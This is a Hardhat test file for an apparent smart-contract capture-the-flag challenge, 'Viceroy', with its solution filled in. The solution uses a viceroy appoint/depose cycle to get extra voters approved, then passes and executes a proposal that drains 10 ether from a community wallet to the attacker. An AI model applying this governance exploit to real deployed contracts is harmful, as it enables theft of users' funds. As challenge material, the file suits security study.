const { expect, use } = require("chai");
const { ethers } = require("hardhat");
const { BigNumber } = ethers;
const helpers = require("@nomicfoundation/hardhat-network-helpers");

use(require("chai-as-promised"));

describe("Viceroy", async function () {
    let attackerWallet, attacker, oligarch, governance, communityWallet;

    before(async function () {
        [_, attackerWallet] = await ethers.getSigners();

        // Name your contract GovernanceAttacker. It will be minted the NFT it needs.
        const AttackerFactory = await ethers.getContractFactory("GovernanceAttacker");
        attacker = await AttackerFactory.connect(attackerWallet).deploy();
        await attacker.deployed();

        const OligarchFactory = await ethers.getContractFactory("OligarchyNFT");
        oligarch = await OligarchFactory.deploy(attacker.address);
        await oligarch.deployed();

        const GovernanceFactory = await ethers.getContractFactory("Governance");
        governance = await GovernanceFactory.deploy(oligarch.address, {
            value: BigNumber.from("10000000000000000000"),
        });
        await governance.deployed();

        const walletAddress = await governance.communityWallet();
        communityWallet = await ethers.getContractAt("CommunityWallet", walletAddress);
        expect(await ethers.provider.getBalance(walletAddress)).equals(BigNumber.from("10000000000000000000"));
    });

    // prettier-ignore;
    it("conduct your attack here", async function () {
        let [, , viceroy1, viceroy2, ...voters] = await ethers.getSigners();
        await attacker.connect(viceroy1).appoint(governance.address, viceroy1.address);
        const firstFiveVoters = voters.slice(0, 5);
        const secondFiveVoters = voters.slice(5, 10);
        const communityWallet = await ethers.getContractFactory("CommunityWallet");
        const payload = communityWallet.interface.encodeFunctionData("exec", [
            attackerWallet.address,
            "0x",
            ethers.utils.parseEther("10"),
        ]);
        const proposalId = ethers.utils.keccak256(payload);
        await governance.connect(viceroy1).createProposal(viceroy1.address, payload);

        for (const voter of firstFiveVoters) {
            await governance.connect(viceroy1).approveVoter(voter.address);
            await governance.connect(voter).voteOnProposal(proposalId, true, viceroy1.address);
        }
        await attacker.connect(viceroy1).deposeAndApoint(governance.address, viceroy1.address, viceroy2.address);
        for (const voter of secondFiveVoters) {
            await governance.connect(viceroy2).approveVoter(voter.address);
            await governance.connect(voter).voteOnProposal(proposalId, true, viceroy2.address);
        }

        await governance.executeProposal(proposalId);
    });

    after(async function () {
        const walletBalance = await ethers.provider.getBalance(communityWallet.address);
        expect(walletBalance).to.equal(0);

        const attackerBalance = await ethers.provider.getBalance(attackerWallet.address);
        expect(attackerBalance).to.be.greaterThanOrEqual(BigNumber.from("10000000000000000000"));

        expect(await ethers.provider.getTransactionCount(attackerWallet.address)).to.equal(
            1,
            "must exploit in one transaction"
        );
    });
});
